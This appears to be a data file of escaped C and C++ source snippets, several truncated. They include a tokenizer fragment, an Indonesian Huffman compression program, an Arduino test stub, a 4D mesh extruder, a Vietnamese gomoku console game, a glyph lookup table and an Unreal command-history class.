Token(TokenType::ATOM, value, loc, atom);\n        }\n        else if (isalnum(first_char))\n        {\n            int start_index = this->loc;\n            int end_index = 0;\n\n            while (this->is_not_empty() && isalnum(this->text.at(this->loc)))\n            {\n                this->chop_char();\n                end_index += 1;\n            }\n            std::string value = this->text.substr(start_index, end_index);\n\n            Atom *atom = new Atom(AtomType::SYMBOL, value);\n\n            return new Token(TokenType::ATOM, value, loc, atom);\n        }\n        else if (first_char == '\"')\n        {\n            this->chop_char();\n            int start_index = this->loc;\n            int end_index = 0;\n\n            while (this->is_not_empty() && this->text.at(this->loc) != '\"')\n            {\n                this->chop_char();\n                end_index += 1;\n            }\n\n            this->chop_char();\n            std::string value = this->text.substr(start_index, end_index);\n\n            Atom *atom = new Atom(AtomType::STRING, value);\n\n            return new Token(TokenType::ATOM, value, loc, atom);\n        }\n        else\n        {\n            UNREACHABLE;\n        }\n    }\n\n    bool is_not_empty()\n    {\n        return this->loc + 1 < this->text.length();\n    }\n\nprivate:\n    float string_to_float(std::string input)\n    {\n        return ::atof(input.c_str",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#include \"huffman.h\"\n\nvoid kompres() {\n    system(\"cls\");\n    char str[100];\n    Node* head = NULL;\n\n    printf(\"Masukkan sebuah string: \");\n    fgets(str, sizeof(str), stdin);\n\n    // Menghilangkan karakter newline jika ada\n    str[strcspn(str, \"\\n\")] = 0;\n\n    printf(\"\\n\");\n    cetakJudul(\"Tahap 1 - Pengumpulan Frekuensi Karakter\", 60);\n\n    // Menghitung frekuensi karakter\n    hitungFrekuensiKarakter(str, &head);\n\n    printf(\"Hitung Frekuensi\\n\");\n    cetakFrekuensi(head);\n    printf(\"\\n\");\n\n    cetakJudul(\"Tahap 2 - Pembuatan Antrian Prioritas\", 60);\n\n    // Mengurutkan frekuensi secara menaik\n    urutkanFrekuensi(&head);\n\n    printf(\"Urutkan Berdasarkan Frekuensi (Ascending)\\n\");\n    cetakFrekuensi(head);\n    printf(\"\\n\");\n\n    cetakJudul(\"Tahap 3 - Pembangunan Huffman Tree\", 60);\n\n    // Membuat pohon Huffman\n    Node* huffmanTree = buatHuffmanTree(head);\n\n    printf(\"Pohon Huffman\\n\");\n    cetakHuffmanTree(huffmanTree, 0);\n    printf(\"\\n\");\n\n    // Buka file untuk menulis output DOT\n    FILE* file = fopen(\"huffman_tree.dot\", \"w\");\n    fprintf(file, \"digraph G {\\n\");\n\n    // Menulis edge dari pohon Huffman\n    generateDotFile(huffmanTree, file);\n\n    fprintf(file, \"}\\n\");\n    fclose(file);\n\n    printf(\"DOT file generated: huffman_tree.dot\\n\");\n    printf(\"Run 'dot -Tpng huffman_tree.dot -o huffman_tree.png' to generate the PNG image.\\n\");\n\n    cetakJudul(\"Tahap 4 - Penetapan Kode Huffman\", 60);\n\n    // Mendapatkan kode Huffman untuk setiap karakter\n    char code[100];\n    dapatkanKodeHuffman(huffmanTree, code, 0);\n\n    printf(\"Kode Huffman\\n\");\n    cetakKodeHuffman(huffmanTree);\n    printf(\"\\n\");\n\n    cetakJudul(\"Tahap 5 - Pengkodean Teks\", 60);\n\n    // Mengubah string menjadi kode Huffman\n    ubahStringMenjadiHuffman(str, huffmanTree);\n    printf(\"\\n\");\n\n    // Simpan huffman tree\n    cetakJudul(\"Tahap 6 - Simpan Huffman Tree ke dalam file Binary\", 60);\n    saveHuffmanTree(huffmanTree, \"huffman_tree.bin\");\n    printf(\"huffman_tree.bin\\n\\n\");\n\n    // Simpan hasil kompres\n    cetakJudul(\"Tahap 7 - Simpan Hasil Kompres\", 60);\n    compressData(str, huffmanTree, \"compressed_data.bin\");\n    printf(\"compressed_data.bin\\n\\n\");\n\n    // Bebaskan memori\n    Node* current = head;\n    while (current != NULL) {\n        Node* next = current->next;\n        free(current->code);\n        free(current);\n        current = next;\n    }\n\n    printf(\"Tekan Enter untuk kembali...\");\n    getchar();\n}\n\nvoid dekompres() {\n    system(\"cls\");\n\n    // Baca Huffman Tree dari file\n    Node* loadedTree = loadHuffmanTree(\"huffman_tree.bin\");\n\n    // Dekompres\n    char decompressed[256];\n    decompressData(\"compressed_data.bin\", loadedTree, decompressed);\n\n    // Print hasil dekompres\n    printf(\"Decompressed text: %s\\n\", decompressed);\n\n    printf(\"\\nTekan Enter untuk kembali...\");\n    getchar();\n}\n\n// Fungsi untuk membersihkan buffer input\nvoid bersihkanBuffer() {\n    int c;\n    while ((c = getchar()) != '\\n' && c != EOF);\n}\n\n// Fungsi utama\nint main() {\n    int key;\n\n    do {\n        system(\"cls\");\n        cetakJudul(\"HUFFMAN CODE\", 60);\n        printf(\"1. Kompres\\n\");\n        printf(\"2. Dekompres\\n\");\n        printf(\"3. Keluar\\n\\n\");\n        printf(\"Pilih: \");\n        scanf(\"%d\", &key);\n        bersihkanBuffer();\n\n        switch (key) {\n            case 1:\n                kompres();\n                break;\n            case 2:\n                dekompres();\n            default:\n                break;\n        }\n    } while (key != 3);\n\n    return 0;\n}\n",
    "//\n//    FILE: unit_test_001.cpp\n//  AUTHOR: Rob Tillaart\n//    DATE: 2023-06-28\n// PURPOSE: unit tests for Smooth library\n//          https://github.com/RobTillaart/SIMON\n//\n\n\n// supported assertions\n// ----------------------------\n// assertEqual(expected, actual);               // a == b\n// assertNotEqual(unwanted, actual);            // a != b\n// assertComparativeEquivalent(expected, actual);    // abs(a - b) == 0 or (!(a > b) && !(a < b))\n// assertComparativeNotEquivalent(unwanted, actual); // abs(a - b) > 0  or ((a > b) || (a < b))\n// assertLess(upperBound, actual);              // a < b\n// assertMore(lowerBound, actual);              // a > b\n// assertLessOrEqual(upperBound, actual);       // a <= b\n// assertMoreOrEqual(lowerBound, actual);       // a >= b\n// assertTrue(actual);\n// assertFalse(actual);\n// assertNull(actual);\n\n// // special cases for floats\n// assertEqualFloat(expected, actual, epsilon);    // fabs(a - b) <= epsilon\n// assertNotEqualFloat(unwanted, actual, epsilon); // fabs(a - b) >= epsilon\n// assertInfinity(actual);                         // isinf(a)\n// assertNotInfinity(actual);                      // !isinf(a)\n// assertNAN(arg);                                 // isnan(a)\n// assertNotNAN(arg);                              // !isnan(a)\n\n\n#include <ArduinoUnitTests.h>\n\n#include \"Arduino.h\"\n#include \"SmartPin.h\"\n\n\nunittest_setup()\n{\n  fprintf(stderr, \"Arduino SmartPin library\\n\");\n}\n\n\nunittest_teardown()\n{\n}\n\n\nunittest(test_constructor)\n{\n  // assertEqual(42, sm.get_window());\n  // assertEqual(0, sm.get_count());\n  // assertEqualFloat(0, sm.get_avg(), 0.0001);\n\n  // Smooth sm0(5, 0, 0);\n  // assertEqual(5, sm0.get_window());\n  // assertEqual(0, sm0.get_count());\n  // assertEqualFloat(0, sm0.get_avg(), 0.0001);\n\n  // Smooth sm1(7, 20);\n  // assertEqual(7, sm1.get_window());\n  // assertEqual(20, sm1.get_count());\n  // assertEqualFloat(0, sm0.get_avg(), 0.0001);\n\n  // Smooth sm2(15, 25, 10);\n  // assertEqual(15, sm2.get_window());\n  // assertEqual(25, sm2.get_count());\n  // assertEqualFloat(10, sm2.get_avg(), 0.0001);\n}\n\n\nunittest_main()\n\n\n//  -- END OF FILE --\n\n",
    "#include \"obj_extruder.hpp\"\n#include \"obj_types.hpp\"\n#include \"obj_loader.hpp\"\n#include \"obj_writer.hpp\"\n#include \"obj_utils.hpp\"\n\n#define GLM_ENABLE_EXPERIMENTAL\n#include <glm/gtx/hash.hpp>\n\n#include <iostream>\n#include <map>\n#include <cassert>\n#include <cstring>\n#include <vector>\n\nnamespace std\n{\n\ttemplate<>\n\tstruct hash<obj::vert4_t>\n\t{\n\t\tsize_t operator()(obj::vert4_t const& vertex) const\n\t\t{\n\t\t\tsize_t seed = 0;\n\t\t\tobj::hashCombine(seed, vertex.position, vertex.normal, vertex.uv);\n\t\t\treturn seed;\n\t\t}\n\t};\n\n    template<>\n\tstruct hash<obj::face3_t>\n\t{\n\t\tsize_t operator()(obj::face3_t const& face) const\n\t\t{\n\t\t\tsize_t seed = 0;\n\t\t\tobj::hashCombine(seed, face.a, face.b, face.c);\n\t\t\treturn seed;\n\t\t}\n\t};\n}\n\nnamespace obj\n{\n\tvoid addTriangle(uint32_t a, uint32_t b, uint32_t c, std::unordered_map<face3_t, bool>& faces)\n\t{\n\t\tface3_t face{a, b, c};\n\n\t\tif(faces.count(face) == 0) faces[face] = true;\n\t\telse faces[face] = false;\n\t}\n\n    bool ObjExtruder::extrudeObj4Face(const std::string& filepathSrc, const std::string& filepathDst, ExtrusionType extrusionType, std::string* err)\n    {\n        shape_t shape{};\n        attrib_t attrib{};\n\n        if(!ObjLoader::loadObj4(filepathSrc, &shape, &attrib, err)) return false;\n\n        shape_t oShape{};\n        attrib_t oAttrib{};\n\n        switch(extrusionType)\n        {\n            case PRISM: \n                if(!extrudeObj4PRISM(filepathSrc, filepathDst, &shape, &attrib, &oShape, &oAttrib, err)) return false;\n                break;\n        }\n\n        if(!ObjWriter::saveObj4(filepathDst, &oShape, &oAttrib, err)) return false;\n        \n        return true;\n    }\n\n\tbool ObjExtruder::extrudeObj3(const std::string& filepathSrc, const std::string& filepathDst, ExtrusionType extrusionType, std::string* err)\n    {\n        shape_t shape3{};\n        attrib_t attrib3{};\n\n        if(!ObjLoader::loadObj3(filepathSrc, &shape3, &attrib3, err)) return false;\n\n\t\tshape_t shape4{};\n        attrib_t attrib4{};\n\n        if(!Obj3ToObj4Face(shape3, attrib3, shape4, attrib4)) return false;\n\n        shape_t oShape{};\n        attrib_t oAttrib{};\n\n        switch(extrusionType)\n        {\n            case PRISM: \n                if(!extrudeObj4PRISM(filepathSrc, filepathDst, &shape4, &attrib4, &oShape, &oAttrib, err)) return false;\n                break;\n        }\n\n        if(!ObjWriter::saveObj4(filepathDst, &oShape, &oAttrib, err)) return false;\n        \n        return true;\n    }\n\n\tbool ObjExtruder::Obj3ToObj4Face(shape_t& shape3, attrib_t& attrib3, shape_t& shape4, attrib_t& attrib4)\n\t{\n\t\tshape4.name = shape3.name;\n\n\t\t//TODO \n\n\t\treturn true;\n\t}\n\n\tvoid getData(std::vector<glm::vec4>& vertPositions, std::vector<index_t>& indices, shape_t* shape, attrib_t* attrib)\n\t{\n\t\tstd::unordered_map<glm::vec4, uint32_t> uniquePositions;\n\n\t\tfor(int i = 0; i < shape->mesh.indeces.size(); i++) \n\t\t{\n\t\t\tglm::vec4 pos{};\n\n\t\t\tauto& index = shape->mesh.indeces[i];\n\n\t\t\tif(index.vertex_index >= 0)\n\t\t\t{\n\t\t\t\tpos = \n\t\t\t\t{\n\t\t\t\t\tattrib->vertices[4 * index.vertex_index + 0],\n\t\t\t\t\tattrib->vertices[4 * index.vertex_index + 1],\n\t\t\t\t\tattrib->vertices[4 * index.vertex_index + 2],\n\t\t\t\t\tattrib->vertices[4 * index.vertex_index + 3],\n\t\t\t\t};\n\n\t\t\t}\n\n\t\t\tif(uniquePositions.count(pos) == 0)\n\t\t\t{\n\t\t\t\tuniquePositions[pos] = static_cast<uint32_t>(vertPositions.size());\n\t\t\t\tvertPositions.push_back(pos);\n\t\t\t}\n\n\t\t\tindices.push_back(\n\t\t\t\tindex_t{\n\t\t\t\t\tuniquePositions[pos] + 1,\n\t\t\t\t\t1,\n\t\t\t\t\t1\n\t\t\t\t}\n\t\t\t);\n\t\t}\n\t}\n\n\tvoid addTetra(u_int32_t iA, u_int32_t iB, u_int32_t iC, u_int32_t iD, glm::vec4& a, glm::vec4& b, glm::vec4& c, glm::vec4& d, std::vector<glm::vec4>& vertPositionsSide, std::vector<index_t>& indicesSide)\n\t{\n\t\tvertPositionsSide.push_back(a);\n\t\tvertPositionsSide.push_back(b);\n\t\tvertPositionsSide.push_back(c);\n\t\tvertPositionsSide.push_back(d);\n\n\t\tindicesSide.push_back({iA, 1, 1});\n\t\tindicesSide.push_back({iB, 1, 1});\n\t\tindicesSide.push_back({iC, 1, 1});\n\t\tindicesSide.push_back({iD, 1, 1});\n\t}\n\n\tvoid getOpenFaces(std::vector<face3_t>& openFaces, std::vector<glm::vec4>& vertPositions, std::vector<index_t>& indices)\n\t{\n        std::unordered_map<face3_t, bool> faces;\n\n\t\tfor(int i = 0; i < indices.size(); i += 4)\n\t\t{\n\t\t\tauto a = indices[i + 0].vertex_index;\n\t\t\tauto b = indices[i + 1].vertex_index;\n\t\t\tauto c = indices[i + 2].vertex_index;\n\t\t\tauto d = indices[i + 3].vertex_index;\n\n\t\t\taddTriangle(a, b, c, faces);\n\t\t\taddTriangle(a, b, d, faces);\n\t\t\taddTriangle(a, c, d, faces);\n\t\t\taddTriangle(b, c, d, faces);\n\t\t}\n\n\t\tfor(auto& kv : faces)\n            if(kv.second) openFaces.push_back(kv.first);\n\t}\n\n    bool ObjExtruder::extrudeObj4PRISM(const std::string& filepathSrc, const std::string& filepathDst, shape_t* shape, attrib_t* attrib, shape_t* oShape, attrib_t* oAttrib, std::string* err)\n    {\n        std::vector<glm::vec4> vertPositionsBottom{};\n\t\tstd::vector<index_t> indicesBottom{};\n\t\tgetData(vertPositionsBottom, indicesBottom, shape, attrib);\n        \n        oShape->name = shape->name + \"_4D\";\n\n\t\t// Add Top Face\n\n\t\tstd::vector<glm::vec4> vertPositionsT",
    "\ufeff#include <iostream>\n#include <string>\n#include <Windows.h>\n#include <iomanip>\n#include <stdio.h>\n#include <conio.h>\n#include <time.h>\n#include <stack>\n#define MAX 100\nusing namespace std;\n\nvoid textcolor(int x) {\n\tHANDLE mau;\n\tmau = GetStdHandle(STD_OUTPUT_HANDLE);\n\tSetConsoleTextAttribute(mau, x);\n}\n\nvoid gotoxy(int x, int y) {\n\tHANDLE hConsoleOutput;\n\tCOORD Cursor_an_Pos = { x - 1, y - 1 };\n\thConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);\n\tSetConsoleCursorPosition(hConsoleOutput, Cursor_an_Pos);\n}\n\nstruct ToaDo\n{\n\tint x, y;\n};\ntypedef struct ToaDo toado;\n\nchar KiemTraHangNgang(char a[MAX][MAX], int n, int vitridong, int vitricot) {\n\tint dem = 1; //T\u00ednh lu\u00f4n qu\u00e2n v\u1eeba \u0111\u00e1nh\n\n\t//X\u00e9t b\u00ean tr\u00e1i tr\u01b0\u1edbc (Ngang tr\u00e1i)\n\tfor (int j = vitricot - 1; j >= 0; --j) {\n\t\tif (a[vitridong][j] == a[vitridong][vitricot]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[vitridong][vitricot];\n\t\t\t}\n\t\t}\n\t\telse //Kh\u00f4ng c\u00f2n t\u00ednh li\u00ean t\u1ee5c => d\u1eebng qu\u00e1 tr\u00ecnh l\u1eb7p \n\t\t{\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t//X\u00e9t qua b\u00ean ph\u1ea3i (ngang ph\u1ea3i)\n\tfor (int j = vitricot + 1; j < n; ++j) {\n\t\tif (a[vitridong][j] == a[vitridong][vitricot]) {\n\t\t\tdem++;\n\t\t}\n\t\tif (dem == 5) {\n\t\t\treturn a[vitridong][vitricot];\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn '.'; // Ch\u01b0a th\u1eafng\n}\n\nchar KiemTraHangDoc(char a[MAX][MAX], int n, int vitridong, int vitricot) {\n\tint dem = 1;\n\tfor (int j = vitridong - 1; j >= 0; --j) {\n\t\tif (a[j][vitricot] == a[vitridong][vitricot]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[vitridong][vitricot];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tfor (int j = vitridong + 1; j < n; ++j) {\n\t\tif (a[j][vitricot] == a[vitridong][vitricot]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[vitridong][vitricot];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn '.';\n}\n\nchar KiemTraHangCheoChinh(char a[MAX][MAX], int n, int m, int x, int y) {\n\tint dem = 1;\n\n\t//Ki\u1ec3m tra ch\u00e9o ch\u00ednh tr\u00ean \n\tint i = x - 1;\n\tint j = y - 1;\n\twhile (true) {\n\t\tif (i < 0 || j < 0) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (a[i][j] == a[x][y]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[x][y];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\n\t\ti--;\n\t\tj--;\n\t}\n\n\ti = x + 1;\n\tj = y + 1;\n\twhile (true) {\n\t\tif (i > n || j > m) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (a[j][i] == a[x][y]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[x][y];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t\ti++;\n\t\tj++;\n\t}\n\n\treturn '.';\n}\n\nchar KiemTraCheoPhu(char a[MAX][MAX], int n, int m, int x, int y) {\n\tint dem = 1;\n\tint i = x - 1;\n\tint j = y + 1;\n\n\twhile (true) {\n\t\tif (i < 0 || j == m) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (a[i][j] == a[x][y]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[x][y];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t\ti--;\n\t\tj++;\n\t}\n\n\ti = x + 1;\n\tj = y - 1;\n\twhile (true) {\n\t\tif (i == n || j < 0) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (a[i][j] == a[x][y]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[x][y];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t\ti++;\n\t\tj--;\n\t}\n\n\treturn '.';\n}\n\nvoid BanCo(int n, int m, int crdong, int cdcot, char c[][MAX]) {\n\t// Ch\u00fa \u00fd nh\u1eefng k\u00fd t\u1ef1 sau \u00e2\u00e2y:\n\t// i = 218 => i- : g\u00f3c tr\u00ean c\u00f9ng b\u00ean tr\u00e1i\n\t// i = 191 => -i : g\u00f3c tr\u00ean c\u00f9ng b\u00ean ph\u1ea3i\n\t// i = 217 => _I : g\u00f3c d\u01b0\u1edbi c\u00f9ng b\u00ean ph\u1ea3i\n\t// i = 192 => |_ : g\u00f3c du\u1edbi c\u00f9ng b\u00ean tr\u00e1i\n\t// i = 196 => _\n\t// i = 179 => |\n\t// i = 194 => T\n\t// i = 193 => T ng\u01b0\u1ee3c\n\t// i = 195 => |-\n\t// i = 180 => -|\n\t// i = 197 => + l\u1edbn\n\n\tint kc = log10(crdong) + 1;\n\tcout << setw(crdong / 2 + 4);\n\t//cout << \"\\t\" << setw(cddong / 2 + 1);\n\tfor (int i = 0; i < m - 1 ; ++i) {\n\t\tcout << i;\n\t\tcout << setw(crdong + 1);\n\t}\n\tcout << m - 1 << endl;\n\n\n\tstring a, b;\n\tfor (int i = 0; i < crdong; ++i) {\n\t\ta += (char)196;\n\t}\n\n\t\n\t//for (int j = 0; j < socot; ++j) {\n\t//\tb = b + (char)179 + \"\\n\" + b;\n\t//}\n\n\tb = (char)179;\n\n\t//H\u00e0ng tr\u00ean\n\tcout << setw(3) << (char)218;\n\tfor (int i = 1; i < m; ++i) {\n\t\tcout << a << (char)194;\n\n\t}\n\tcout << a << (char)191;\n\n\t//H\u00e0ng gi\u1eefa\n\tfor (int i = 1; i < n; ++i) {\n\t\tint size = 3 - log10(i + 1);\n\t\t//Ph\u1ea7n c\u1ed9t\n\t\tfor (int cd = 0; cd < cdcot; ++cd) {\n\t\t\tcout << \"\\n\";\n\t\t\t// Ph\u1ea7n s\u1ed1\n\t\t\tif (cd == cdcot / 2) {\n\t\t\t\tcout << i << setw(size);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << setw(3);\n\t\t\t}\n\t\t\tfor (int j = 0; j < m; ++j) {\n\t\t\t\tcout << b;\n\t\t\t\tfor (int kc = 0; kc < crdong; ++kc) {\n\t\t\t\t\tif (kc != crdong / 2) {\n\t\t\t\t\t\tcout << \" \";\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tif (c[i][j] == 'x' || c[i][j] == 'o') {\n\t\t\t\t\t\t\tc[i][j] == 'x' ? textcolor(13 + 32) : textcolor(14 + 32);\n\t\t\t\t\t\t\tcout << c[i][j];\n\t\t\t\t\t\t\ttextcolor(7);\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse {\n\t\t\t\t\t\t\tcout << \" \";\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t}\n\t\t\tcout << b;\n\t\t}\n\n\n\t\tif (i == n - 1) {\n\t\t\tbreak;\n\t\t}\n\n\t\t//Ph\u1ea7n d\u00f2ng\n\t\tcout << \"\\n\" << setw(3) << (char)195;\n\t\tfor (int j = 1; j < m; ++j) {\n\t\t\tcout << a << (char)197;\n\t\t}\n\t\tcout << a << (char)180;\n\t}\n\n\t//H\u00e0ng d\u01b0\u1edbi\n\tcout << \"\\n\" << setw(3) << (char)192;\n\tfor (int i = 1; i < m; ++i) {\n\t\tcout << a << (char)193;\n\t}\n\tcout << a << (char)217;\n}\n\n//=============== \u0110\u00e1nh b\u1eb1ng t\u1ecda \u0111\u1ed9 ==================\n// ==================== C\u00e1ch 1:\nvoid ToaDoCanDanh(int &luotdi, char a[][MAX], int n, int m, int crdong, int cdcot) {\n\tint x, y;\n\tchar quanco;\n\tquanco = luotdi == 0 ? 'x' : 'o';\n\tcout << \"\\nLuot di hien tai cua quan co: \";\n\tif (quanco == 'x') {\n\t\ttextcolor(13);\n\t\tcout << ",
    "#include \"graphics.hpp\"\n#include \"glyphs.hpp\"\n\nuint16_t textCurX = 1;\nuint16_t textCurY = 1;\n\nuint32_t defaultTextCol;\nuint32_t defaultBGCol;\n\nuint32_t warnTextCol;\nuint32_t warnBGCol;\n\nuint32_t errorTextCol;\nuint32_t errorBGCol;\n\nuint16_t screenWidth;\nuint16_t screenHeight;\n\nGlyph getglyph(uint8_t code) {\n    switch (code)\n    {\n    case 'A':\n        return LATIN_UPPERCASE_A;\n    case 'B':\n        return LATIN_UPPERCASE_B;\n    case 'C': \n        return LATIN_UPPERCASE_C;\n    case 'D':\n        return LATIN_UPPERCASE_D;\n    case 'E':\n        return LATIN_UPPERCASE_E;\n    case 'F':\n        return LATIN_UPPERCASE_F;\n    case 'G':\n        return LATIN_UPPERCASE_G;\n    case 'H':\n        return LATIN_UPPERCASE_H;\n    case 'I':\n        return LATIN_UPPERCASE_I;\n    case 'J':\n        return LATIN_UPPERCASE_J;\n    case 'K':\n        return LATIN_UPPERCASE_K;\n    case 'L':\n        return LATIN_UPPERCASE_L;\n    case 'M':\n        return LATIN_UPPERCASE_M;\n    case 'N':\n        return LATIN_UPPERCASE_N;\n    case 'O':\n        return LATIN_UPPERCASE_O;\n    case 'P':\n        return LATIN_UPPERCASE_P;\n    case 'Q':\n        return LATIN_UPPERCASE_Q;\n    case 'R':\n        return LATIN_UPPERCASE_R;\n    case 'S':\n        return LATIN_UPPERCASE_S;\n    case 'T':\n        return LATIN_UPPERCASE_T;\n    case 'U':\n        return LATIN_UPPERCASE_U;\n    case 'V':\n        return LATIN_UPPERCASE_V;\n    case 'W':\n        return LATIN_UPPERCASE_W;\n    case 'X':\n        return LATIN_UPPERCASE_X;\n    case 'Y':\n        return LATIN_UPPERCASE_Y;\n    case 'Z':\n        return LATIN_UPPERCASE_Z;\n    case 'a':\n        return LATIN_LOWERCASE_A;\n    case 'b':\n        return LATIN_LOWERCASE_B;\n    case 'c': \n        return LATIN_LOWERCASE_C;\n    case 'd':\n        return LATIN_LOWERCASE_D;\n    case 'e':\n        return LATIN_LOWERCASE_E;\n    case 'f':\n        return LATIN_LOWERCASE_F;\n    case 'g':\n        return LATIN_LOWERCASE_G;\n    case 'h':\n        return LATIN_LOWERCASE_H;\n    case 'i':\n        return LATIN_LOWERCASE_I;\n    case 'j':\n        return LATIN_LOWERCASE_J;\n    case 'k':\n        return LATIN_LOWERCASE_K;\n    case 'l':\n        return LATIN_LOWERCASE_L;\n    case 'm':\n        return LATIN_LOWERCASE_M;\n    case 'n':\n        return LATIN_LOWERCASE_N;\n    case 'o':\n        return LATIN_LOWERCASE_O;\n    case 'p':\n        return LATIN_LOWERCASE_P;\n    case 'q':\n        return LATIN_LOWERCASE_Q;\n    case 'r':\n        return LATIN_LOWERCASE_R;\n    case 's':\n        return LATIN_LOWERCASE_S;\n    case 't':\n        return LATIN_LOWERCASE_T;\n    case 'u':\n        return LATIN_LOWERCASE_U;\n    case 'v':\n        return LATIN_LOWERCASE_V;\n    case 'w':\n        return LATIN_LOWERCASE_W;\n    case 'x':\n        return LATIN_LOWERCASE_X;\n    case 'y':\n        return LATIN_LOWERCASE_Y;\n    case 'z':\n        return LATIN_LOWERCASE_Z;\n    case '0':\n        return NUMBER_0;\n    case '1':\n        return NUMBER_1;\n    case '2':\n        return NUMBER_2;\n    case '3':\n        return NUMBER_3;\n    case '4':\n        return NUMBER_4;\n    case '5':\n        return NUMBER_5;\n    case '6':\n        return NUMBER_6;\n    case '7':\n        return NUMBER_7;\n    case '8':\n        return NUMBER_8;\n    case '9':\n        return NUMBER_9;\n    case '.':\n        return DOT;\n    case ',':\n        return COMMA;\n    case ':':\n        return COLON;\n    case ';':\n        return SEMICOLON;\n    case '!':\n        return EXCLAMATION_POINT;\n    case '?':\n        return QUESTION_MARK;\n    case '@':\n        return AT_SYMBOL;\n    case '#':\n        return HASH;\n    case '$':\n        return DOLLAR_SIGN;\n    case '%':\n        return PERCENTAGE;\n    case '^':\n        return UP;\n    case '&':\n        return AMPERSAND;\n    case '*':\n        return STAR;\n    case '(':\n        return OPEN_ROUND_BRACKET;\n    case ')':\n        return CLOSE_ROUND_BRACKET;\n    case '[':\n        return OPEN_SQUARE_BRACKET;\n    case ']':\n        return CLOSE_SQUARE_BRACKET;\n    case '{':\n        return OPEN_CURLY_BRACKET;\n    case '}':\n        return CLOSE_CURLY_BRACKET;\n    case '-':\n        return MINUS;\n    case '+':\n        return PLUS;\n    case '=':\n        return EQUALS;\n    case '/':\n        return SLASH;\n    case '\\\\':\n        return BACKSLASH;\n    case '|':\n        return LINE;\n    case '<':\n        return LESS_SYMBOL;\n    case '>':\n        return MORE_SYMBOL;\n    case '\\'':\n        return APOSTROPHE;\n    case '\"':\n        return QUOTATION_MARK;\n    case '~':\n        return TILDA;\n    case '_':\n        return UNDERSCORE;\n    default:\n        return INVALIDCHAR;\n    }\n}\n\nGlyph getglyph(uint16_t unicode) {\n    if (unicode < 0x80)\n        return getglyph((uint8_t)(unicode & 0x7F));\n    switch (unicode) {\n        case '\u0410':\n            return CYRILLIC_UPPERCASE_A;\n        case '\u0411':\n            return CYRILLIC_UPPERCASE_BE;\n        case '\u0412':\n            return CYRILLIC_UPPERCASE_VE;\n        case '\u0413':\n            return CYRILLIC_UPPERCASE_GE;\n        case '\u0414':\n            return CYRILLIC_UPPERCASE_DE;\n        case '\u0415':\n        ",
    "#include \"CommandHistoryFixedSize.h\"\n#include <CommandUtil.h>\n\nUCommandHistoryFixedSize::UCommandHistoryFixedSize()\n{\n\tHistory.Init(NULL, MaxSize); // fill array with NULL\n}\n\nint UCommandHistoryFixedSize::GetMaxSize_Implementation()\n{\n\treturn MaxSize;\n}\n\nvoid UCommandHistoryFixedSize::Push_Implementation(const TScriptInterface<ICommand>& Command)\n{\n\t/* perform null checks here, this is the only entry point for commands into the history */\n\tif (&Command == NULL)\n\t\treturn;\n\n\tUObject* CommandObject = Command.GetObject();\n\tif (CommandObject == NULL)\n\t\treturn;\n\n\tif (ICommand::Execute_Do(CommandObject))\n\t{\n\t\tint NextIndex = CurrentIndex + 1;\n\n\t\t// max size check, replace oldest in array\n\t\tif (NextIndex == MaxSize)\n\t\t{\n\t\t\tCommandUtil::DestroyCommand(History[TrueIndex(NextIndex)]); \n\t\t\tIndexOffset = TrueIndex(1); \n\t\t\tNextIndex = MaxSize - 1;\n\t\t}\n\n\t\tClearRedoable(); // clear redoable, so history does not branch\n\n\t\tHistory[TrueIndex(NextIndex)] = Command;\n\t\tLastIndex = CurrentIndex = NextIndex;\n\t}\n}\n\n#pragma region UNDO \n\nbool UCommandHistoryFixedSize::CanUndo_Implementation()\n{\n\treturn CurrentIndex > -1;\n}\n\nvoid UCommandHistoryFixedSize::Undo_Implementation()\n{\n\tif (CanUndo())\n\t\tUndo_Impl();\n}\n\nvoid UCommandHistoryFixedSize::UndoNum_Implementation(int num)\n{\n\tnum = FMath::Clamp(num, 0, CurrentIndex + 1);\n\tfor (size_t i = 0; i < num; ++i)\n\t\tUndo_Impl();\n}\n\nvoid UCommandHistoryFixedSize::UndoAll_Implementation()\n{\n\tUndoNum(CurrentIndex + 1);\n}\n\nvoid UCommandHistoryFixedSize::Undo_Impl()\n{\n\tTScriptInterface<ICommand> Command = History[TrueIndex(CurrentIndex)];\n\tICommand::Execute_Undo(Command.GetObject());\n\t--CurrentIndex;\n}\n\n#pragma endregion\n\n#pragma region REDO\n\nbool UCommandHistoryFixedSize::CanRedo_Implementation()\n{\n\treturn CurrentIndex != LastIndex;\n}\n\nvoid UCommandHistoryFixedSize::Redo_Implementation()\n{\n\tif (CanRedo())\n\t\tRedo_Impl();\n}\n\nvoid UCommandHistoryFixedSize::RedoNum_Implementation(int num)\n{\n\tnum = FMath::Clamp(num, 0, LastIndex - CurrentIndex);\n\tfor (size_t i = 0; i 